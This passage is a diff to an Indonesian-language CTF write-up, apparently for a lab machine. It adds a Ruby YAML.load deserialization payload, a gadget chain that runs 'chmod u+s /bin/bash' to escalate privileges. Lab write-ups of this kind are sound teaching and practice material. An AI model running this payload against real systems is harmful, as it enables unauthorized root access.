@@ -151,7 +151,29 @@ end
 ![image](https://media.discordapp.net/attachments/740245586095112242/1051837942324273253/image.png)
 
 Kita melihat bahwa itu menggunakan YAML.load, yang rentan terhadap deserialization attack. Anda dapat membaca lebih lanjut tentang deserialization YAML [disini](https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md). Kita disini mencoba membuat file “dependencies.yml” dengan [payload](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) untuk mengexploitasikan.
-
+```
+henry@precious:~$ cat dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod u+s /bin/bash
+         method_id: :resolve
+henry@precious:~$
+```
 ![image](https://media.discordapp.net/attachments/740245586095112242/1051838267147943936/image.png)
 ```
 henry@precious:~$ ls -l /bin/bash
